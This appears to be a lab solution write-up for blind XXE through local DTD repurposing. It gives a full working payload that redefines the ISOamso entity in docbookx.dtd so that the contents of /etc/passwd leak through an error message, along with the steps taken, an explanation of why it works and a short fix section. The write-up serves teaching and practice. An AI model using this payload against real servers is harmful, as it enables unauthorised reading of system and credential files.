# Lab 5: XXE via Local DTD Repurposing
**Difficulty:** Expert
**Status:** ✅ Solved

## Vulnerability
Blind XXE — response not reflected directly.
No Burp Collaborator available.
Existing DTD file on server repurposed.
Error messages triggered to exfiltrate /etc/passwd.

## Payload

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE message [
        <!ENTITY % local_dtd SYSTEM 
        "file:///usr/share/yelp/dtd/docbookx.dtd">
        <!ENTITY % ISOamso '
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
            &#x27;file:///nonexistent/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
        '>
        %local_dtd;
    ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>

## Steps
1. Confirmed blind XXE — no response reflection
2. Located existing DTD: /usr/share/yelp/dtd/docbookx.dtd
3. Found ISOamso entity defined in that DTD
4. Redefined ISOamso with nested parameter entities
5. Triggered FileNotFoundException containing /etc/passwd
6. /etc/passwd contents leaked in error message

## Why It Works
Parameter entities redefine existing DTD entities.
Chained entity references trigger file read.
FileNotFoundException reveals file contents in error.
Local DTD provides trusted namespace to bypass restrictions.

## Fix
Disable external entity and parameter entity processing.
Use updated XML libraries with secure defaults.
Never expose detailed error messages in production.
